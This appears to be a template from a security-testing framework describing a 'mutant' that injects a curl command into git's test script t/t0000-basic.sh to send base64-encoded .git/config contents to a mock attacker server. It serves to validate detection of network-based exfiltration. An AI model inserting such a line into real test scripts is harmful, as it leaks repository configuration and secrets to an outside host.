name: Test-phase canary exfiltration via shell script injection
description: Worked example of a test-phase mutant on the git target (t/t0000-basic.sh). Modifies a test shell script to exfiltrate a simulated secret or canary token to a local mock server during test execution, validating network-based observables.

placeholders.TEST_SCRIPT: relative path to the test script file (t/t0000-basic.sh)
placeholders.MOCK_SERVER: base URL or endpoint of the attacker-controlled mock server

template.replacement_value:
# Injected test-phase canary exfiltration
curl -s "http://{{MOCK_SERVER}}{{EXFIL_ENDPOINT}}?data=$(cat .git/config 2>/dev/null | base64)"

preconditions: project contains shell-based test scripts under t/*.sh
the test environment permits local or outbound network calls during test execution
the attacker can modify a test script prior to running the test suite
